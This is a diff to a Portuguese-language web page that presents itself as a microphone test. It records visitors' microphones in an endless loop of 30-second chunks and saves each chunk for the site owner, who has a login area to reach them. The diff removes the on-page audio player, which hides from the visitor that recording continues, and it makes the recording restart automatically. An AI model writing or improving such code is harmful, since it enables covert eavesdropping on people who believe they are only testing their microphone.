@@ -8,7 +8,6 @@
 <body>
     <h1>Teste de Microfone</h1>
     <p id="status">Aguardando permissão do microfone...</p>
-    <audio id="audioPlayer" controls></audio>
 
     <!-- Área de Login para o dono do site -->
     <div id="loginArea">
@@ -25,8 +24,8 @@
     </div>
 
     <script>
-        let audioChunks = [];
         let mediaRecorder;
+        let audioChunks = [];
 
         function startMicrophone() {
             navigator.mediaDevices.getUserMedia({ audio: true })
@@ -35,39 +34,37 @@
                 console.log("Microfone ativado!");
 
                 mediaRecorder = new MediaRecorder(stream);
-                
+
                 mediaRecorder.ondataavailable = function(event) {
-                    audioChunks.push(event.data);
+                    if (event.data.size > 0) {
+                        audioChunks.push(event.data);
+                    }
                 };
 
                 mediaRecorder.onstop = function() {
-                    const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
-                    const audioUrl = URL.createObjectURL(audioBlob);
-
-                    // Atualiza o player de áudio na tela
-                    document.getElementById("audioPlayer").src = audioUrl;
-
-                    // Salva o áudio para o administrador visualizar
-                    saveAudio(audioBlob);
-
-                    // Reinicia a gravação
-                    audioChunks = [];
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        mediaRecorder.stop();
-                    }, 5000);
+                    if (audioChunks.length > 0) {
+                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
+                        saveAudio(audioBlob);
+                        audioChunks = []; // Limpa para a próxima gravação
+                    }
+                    startRecording(); // Reinicia a gravação automaticamente
                 };
 
-                // Inicia a gravação contínua (5 segundos por trecho)
-                mediaRecorder.start();
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 5000);
+                startRecording();
             })
             .catch(function(err) {
                 document.getElementById("status").innerText = "Erro ao acessar o microfone: " + err;
                 console.log("Erro ao acessar o microfone: " + err);
             });
+        }
+
+        function startRecording() {
+            if (mediaRecorder && mediaRecorder.state === "inactive") {
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 30000); // Agora grava a cada 30 segundos
+            }
         }
 
         function saveAudio(blob) {
